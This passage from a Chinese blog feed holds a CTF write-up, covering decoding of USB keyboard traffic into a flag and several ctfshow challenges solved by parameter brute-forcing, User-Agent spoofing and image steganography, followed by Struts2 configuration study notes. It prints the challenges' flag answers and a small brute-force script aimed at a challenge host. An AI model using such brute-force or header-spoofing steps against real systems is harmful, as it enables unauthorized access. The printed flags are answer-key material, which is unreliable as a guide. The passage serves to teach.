<span class="hljs-number">0x0B</span>:<span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-number">0x0C</span>:<span class="hljs-string">&quot;I&quot;</span>,  <span class="hljs-number">0x0D</span>:<span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-number">0x0E</span>:<span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-number">0x0F</span>:<span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-number">0x10</span>:<span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-number">0x11</span>:<span class="hljs-string">&quot;N&quot;</span>,<span class="hljs-number">0x12</span>:<span class="hljs-string">&quot;O&quot;</span>,  <span class="hljs-number">0x13</span>:<span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-number">0x14</span>:<span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-number">0x15</span>:<span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-number">0x16</span>:<span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-number">0x17</span>:<span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-number">0x18</span>:<span class="hljs-string">&quot;U&quot;</span>,<span class="hljs-number">0x19</span>:<span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-number">0x1A</span>:<span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-number">0x1B</span>:<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-number">0x1C</span>:<span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-number">0x1D</span>:<span class="hljs-string">&quot;Z&quot;</span>, <span class="hljs-number">0x1E</span>:<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-number">0x1F</span>:<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-number">0x20</span>:<span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-number">0x21</span>:<span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-number">0x22</span>:<span class="hljs-string">&quot;5&quot;</span>,  <span class="hljs-number">0x23</span>:<span class="hljs-string">&quot;6&quot;</span>, <span class="hljs-number">0x24</span>:<span class="hljs-string">&quot;7&quot;</span>, <span class="hljs-number">0x25</span>:<span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-number">0x26</span>:<span class="hljs-string">&quot;9&quot;</span>, <span class="hljs-number">0x27</span>:<span class="hljs-string">&quot;0&quot;</span>, <span class="hljs-number">0x28</span>:<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-number">0x2a</span>:<span class="hljs-string">&quot;[DEL]&quot;</span>,  <span class="hljs-number">0X2B</span>:<span class="hljs-string">&quot;    &quot;</span>, <span class="hljs-number">0x2C</span>:<span class="hljs-string">&quot; &quot;</span>,  <span class="hljs-number">0x2D</span>:<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-number">0x2E</span>:<span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-number">0x2F</span>:<span class="hljs-string">&quot;[&quot;</span>,  <span class="hljs-number">0x30</span>:<span class="hljs-string">&quot;]&quot;</span>,  <span class="hljs-number">0x31</span>:<span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-number">0x32</span>:<span class="hljs-string">&quot;~&quot;</span>, <span class="hljs-number">0x33</span>:<span class="hljs-string">&quot;;&quot;</span>,  <span class="hljs-number">0x34</span>:<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-number">0x36</span>:<span class="hljs-string">&quot;,&quot;</span>,  <span class="hljs-number">0x37</span>:<span class="hljs-string">&quot;.&quot;</span> &#125;<br><br>nums = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">if</span> line[<span class="hljs-number">0</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">3</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">4</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">9</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">10</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">12</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">13</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">15</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">16</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">18</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">19</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">21</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">22</span>]!=<span class="hljs-string">&#x27;0&#x27;</span>:<br>         <span class="hljs-keyword">continue</span><br>    nums.append(<span class="hljs-built_in">int</span>(line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>],<span class="hljs-number">16</span>))<br><br>keys.close()<br><br>output = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> nums:<br>    <span class="hljs-keyword">if</span> n == <span class="hljs-number">0</span> :<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> n <span class="hljs-keyword">in</span> mappings:<br>        output += mappings[n]<br>    <span class="hljs-keyword">else</span>:<br>        output += <span class="hljs-string">&#x27;[unknown]&#x27;</span><br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;output :\n&#x27;</span> + output<br></code></pre></td></tr></table></figure><p>运行脚本得到：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">output :<br>666C61677B3866396564326639333365662[DEL]31346138643035323364303334396531323939637D<br></code></pre></td></tr></table></figure><p>因为[DEL]是删除键，所以</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">666C61677B38663965643266393333656631346138643035323364303334396531323939637D<br></code></pre></td></tr></table></figure><p>使用脚本将十六进制转换为字符串</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">m=<span class="hljs-string">&quot;666C61677B38663965643266393333656631346138643035323364303334396531323939637D&quot;</span><br>s=bytes.fromhex(m)<br><span class="hljs-built_in">print</span>(s)<br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">b<span class="hljs-string">&#x27;flag&#123;8f9ed2f933ef14a8d0523d0349e1299c&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="ctfshow渔人杯"><a href="#ctfshow渔人杯" class="headerlink" title="ctfshow渔人杯"></a>ctfshow渔人杯</h1><h2 id="签到抽奖"><a href="#签到抽奖" class="headerlink" title="签到抽奖"></a>签到抽奖</h2><p><img src="https://img-blog.csdnimg.cn/20210404122728247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>flag为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">中文也可能是英文及其他小众语言字符<br></code></pre></td></tr></table></figure><h2 id="感受下气氛"><a href="#感受下气氛" class="headerlink" title="感受下气氛"></a>感受下气氛</h2><p>flag是ctfshow{[0-9]{9}}</p><p>正则匹配，符合条件的都可以，比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ctfshow&#123;123456789&#125;<br></code></pre></td></tr></table></figure><h2 id="神仙姐姐"><a href="#神仙姐姐" class="headerlink" title="神仙姐姐"></a>神仙姐姐</h2><p><img src="https://img-blog.csdnimg.cn/20210404123026959.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击拜，抓包<br><img src="https://img-blog.csdnimg.cn/20210404123102170.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>传参num进行爆破，根据提示num在1-1000内<br><img src="https://img-blog.csdnimg.cn/20210404125742649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>都是假flag，一直往下翻<br><img src="https://img-blog.csdnimg.cn/20210404124738984.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>编写脚本进行爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url=<span class="hljs-string">&quot;http://f0c222a9-04f2-431b-ae2b-56e871f6b61b.challenge.ctf.show:8080/sx.php&quot;</span><br>headers = &#123;<br>    <span class="hljs-string">&quot;Cookie&quot;</span>:<span class="hljs-string">&quot;PHPSESSID=gmnu9pfgh503imv66a9tk37ke2&quot;</span><br>&#125;<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1000</span>):<br>    response=requests.get(url, headers=headers);<br>    print(responsea.text)<br></code></pre></td></tr></table></figure><p>得到flag<br><img src="https://img-blog.csdnimg.cn/20210404131900210.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="阿拉丁"><a href="#阿拉丁" class="headerlink" title="阿拉丁"></a>阿拉丁</h2><p>想要啥就有啥</p><p>好家伙，怎么不给flag，不是说想要啥就有啥吗？<br><img src="https://img-blog.csdnimg.cn/20210404132911508.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>继续问，还是没有<br><img src="https://img-blog.csdnimg.cn/20210404133231967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>burp抓包也看不出什么，看了其他师傅的wp，可以直接问flag每一位是什么？，我直接好家伙，这也行。<br><img src="https://img-blog.csdnimg.cn/20210404133052347.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>总共45位<br><img src="https://img-blog.csdnimg.cn/20210404134253711.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>拼接起来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ctfshow&#123;a15b2830-dcf4-4344-99e5-350a561cbf89&#125;<br></code></pre></td></tr></table></figure><h2 id="迷"><a href="#迷" class="headerlink" title="迷"></a>迷</h2><p><img src="https://img-blog.csdnimg.cn/20210404135014838.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>访问靶机地址<br><img src="https://img-blog.csdnimg.cn/20210404135001556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>有一个登录框，还以为是sql注入，看了群里说直接访问/flag<br><img src="https://img-blog.csdnimg.cn/20210404135103522.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>是菜蒙蔽了我的双眼，做个题还被嘲讽了<br><img src="https://img-blog.csdnimg.cn/20210404135150921.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="飘啊飘"><a href="#飘啊飘" class="headerlink" title="飘啊飘"></a>飘啊飘</h2><p>题目描述：有手X就行</p><p>抓包，伪装请求头<code>User-Agent: Android</code>，状态码302重定向，发现了mb.html<br><img src="https://img-blog.csdnimg.cn/20210405171746862.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>直接访问mb.html<br><img src="https://img-blog.csdnimg.cn/20210405172008540.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="简单二维码"><a href="#简单二维码" class="headerlink" title="简单二维码"></a>简单二维码</h2><p>下载附件，一个png图片和一个“wp”，两个假flag。<br><img src="https://img-blog.csdnimg.cn/2021040414094950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>用stegsolve进行异或，发现一张二维码<br><img src="https://img-blog.csdnimg.cn/20210404141133808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>扫码，还是假flag<br><img src="https://img-blog.csdnimg.cn/20210404141301883.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>继续异或，还是迷惑信息<br><img src="https://img-blog.csdnimg.cn/20210404141503298.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>勾选最低通道，依旧是假flag<br><img src="https://img-blog.csdnimg.cn/20210404142416970.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>点击Analyse，选择Steregram Sover进行左右偏移<br><img src="https://img-blog.csdnimg.cn/2021040414211853.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>终于找到了真flag，颈椎治疗，哈哈哈</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ctfshow&#123;Jing_Zhui_Zhi_Liao&#125;<br></code></pre></td></tr></table></figure><h2 id="我跟你拼了"><a href="#我跟你拼了" class="headerlink" title="我跟你拼了"></a>我跟你拼了</h2><p>狸题，下载附件ttt.png和mask.png<img src="https://img-blog.csdnimg.cn/20210404142546734.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我傻乎乎的在那拼图，看了wp原来直接修改图片高度就行了，666，果然狸题就是离谱<br><img src="https://img-blog.csdnimg.cn/20210404143008250.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>参考文章：<br><a href="https://l1near.top/index.php/2021/04/03/100.html">首届“红明谷”杯技能场景赛MISC_WP</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Struts2核心配置</title>
    <link href="/2021/03/28/Struts2%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/"/>
    <url>/2021/03/28/Struts2%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<p>摘要：Struts2框架学习笔记（二）</p> <a id="more"></a><h1 id="Struts2的核心配置"><a href="#Struts2的核心配置" class="headerlink" title="Struts2的核心配置"></a>Struts2的核心配置</h1><h2 id="Struts2常量配置"><a href="#Struts2常量配置" class="headerlink" title="Struts2常量配置"></a>Struts2常量配置</h2><h3 id="常量配置"><a href="#常量配置" class="headerlink" title="常量配置"></a>常量配置</h3><p><strong>1.在default.properties 中配置</strong></p><p>默认值,不会在该配置文件中配置</p><p><strong>2.在struts.properties中配置</strong></p><p>基本不会在该配置文件中配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs xml">###设置默认编码集为UTF-8,作用于HttpServletRequest的setCharacterEncoding方法<br>struts.i18n.encoding=UTF-8 <br><br>###设置action请求的扩展名为action或者没有扩展名，该属性指定需要Struts 2处理的请求后缀，该属性的默认值是action，即所有匹配*.action的请求都由Struts2处理。如果用户需要指定多个请求后缀，则多个后缀之间以英文逗号（,）隔开<br>struts.action.extension=action,, <br><br>###设置浏览器是否缓存静态内容,默认值为true(生产环境下使用),开发阶段最好关闭<br>struts.serve.static.browserCache=true <br><br>### 当struts的配置文件修改后,系统是否自动重新加载该文件,默认值为false(生产环境下使用) <br>struts.configuration.xml.reload=false <br><br> <br>###设置不使用开发者模式，开发模式下使用,这样可以打印出更详细的错误信息<br>struts.devMode = false <br><br>###设置不开启动态方法调用<br>struts.enable.DynamicMethodInvocation=false<br></code></pre></td></tr></table></figure><p><strong>3.在struts.xml中配置</strong></p><blockquote><p>开发中基本上都在该配置文件中配置常量</p></blockquote><p>通过<code>&lt;constant&gt;</code>元素来配置常量，该标签写<code>&lt;struts&gt;</code>下面，和<code>&lt;package&gt;</code>标签同级</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 声明常量 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">constant</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">constant</span>&gt;</span><br></code></pre></td></tr></table></figure><p>示例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 声明常量 --&gt;</span><br><span class="hljs-comment">&lt;!--设置默认编码集UTF-8,解决post请求乱码--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">constant</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts.i18n.encoding&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">constant</span>&gt;</span><br><span class="hljs-comment">&lt;!--设置使用开发者模式--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">constant</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts.devModel&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">constant</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 设置后缀 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">constant</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts.action.extension&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;action,,&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">constant</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><p>4.在web.xml中配置</p><p>配置核心过滤器StrutsPrepareAndExecuteFilter时，通过初始化参数来配置常量,通过<code>&lt;filter&gt;</code>元素的<code>&lt;init-param&gt;</code>子元素指定常量</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br><span class="hljs-comment">&lt;!--指定struts2的核心过滤器--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>struts2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br><span class="hljs-comment">&lt;!--通过init-param元素配置struts2常量，设置开发者模式--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span><br>             <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>struts.devModel<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>             <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br></code></pre></td></tr></table></figure><p>基本不会在该配置文件中配置</p><p>`</p><h3 id="配置文件加载顺序"><a href="#配置文件加载顺序" class="headerlink" title="配置文件加载顺序"></a>配置文件加载顺序</h3><p>1、default.properties：在该文件保存在struts2-core-2.3.37.jar中org/apache/struts2包下。</p><p>2、struts-default.xml：在核心的jar包struts2-core-2.3.37.jar的最下方，struts2框架的核心功能都是在该配置文件中配置的。</p><p>3、struts-plugin.xml配置文件。</p><p>4、struts.xml：在src的目录下，该文件是Web应用自己的配置的配置文件</p><p>5、struts.properties：该文件是Web应用默认的Struts2的配置文件</p><p>6、web.xml：该文件是Web应用的的配置文件</p><p>后加载的配置文件会覆盖掉之前加载的配置文件</p><h2 id="核心配置文件"><a href="#核心配置文件" class="headerlink" title="核心配置文件"></a>核心配置文件</h2><p>在struts2中struts.xml是核心配置文件，struts.xml文件中包含三个标签</p><h3 id="package标签"><a href="#package标签" class="headerlink" title="package标签"></a>package标签</h3><p>与java中的包不同，类似一个代码包，区别不同的action。</p><p>package标签属性：</p><ul><li>name：包的名称，区分不同的package，管理action配置</li><li>namespace：名称空间，一般与标签中的name属性共同决定访问路径</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">namespace=”/” – 根名称空间，不写默认也是“/”。<br>namespace=”/aaa” – 带有名称的名称空间，访问时必须带上才能访问action<br></code></pre></td></tr></table></figure><ul><li> extends：继承，可以继承其他的包，只要继承了，那么该包就包含了其他包的功能，一般都是继承struts-default</li></ul><h3 id="action标签"><a href="#action标签" class="headerlink" title="action标签"></a>action标签</h3><p>action标签主要配置action的访问路径</p><p>action的标签属性：</p><ul><li>name：action的名称，区分不同的action，和package标签中的namespace属性构成了访问路径</li><li>class：配置Action类的全路径全路径=包名+类名，通过反射的原理去执行该类的，默认值是ActionSupport类</li><li>method ： Action类中执行的方法，如果不指定，默认值是execute<h3 id="result标签"><a href="#result标签" class="headerlink" title="result标签"></a>result标签</h3>根据action中的方法返回值，将页面定位到指定的页面或action上</li></ul><p>result标签的属性：</p><ul><li>name属性：和你方法的返回值要一样</li><li>type – 结果类型，有4个值：dispatcher(默认)、redirect、chain、redirectAction</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">dispatcher(默认)和redirect：result标签中“/”代表的是项目根路径，不写就代表当前路径下<br>chain和redirectAction：result标签中“/”没有任何意义，不需要写，写了就是多余，也就是只能从当前路径去指定页面！！！<br>chain：只能转发到同一命名空间下的Action<br>redirect：可以重定向到action中去，也可以重定向到显示页面中去<br></code></pre></td></tr></table></figure><h3 id="struts配置文件分离"><a href="#struts配置文件分离" class="headerlink" title="struts配置文件分离"></a>struts配置文件分离</h3><p>用于按模块开发，在struts.xml配置文件中使用<code>&lt;include file=&quot; &quot;/&gt;</code>包含指定的文件夹</p><p>案例1：有两个配置文件struts-part1.xml和struts-part2.xml，可以在struts.xml中配置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">include</span> <span class="hljs-attr">file</span>=<span class="hljs-string">&quot;struts-part1.xml&quot;</span>/&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">include</span> <span class="hljs-attr">file</span>=<span class="hljs-string">&quot;struts-part2.xml&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><p>案例2：在cn.itcast.action.demo包下有一个配置文件struts_demo.xml，引入该配置文件到struts.xml中</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">include</span> <span class="hljs-attr">file</span>=<span class="hljs-string">&quot;cn/itcast/action/demo/struts_demo.xml&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span 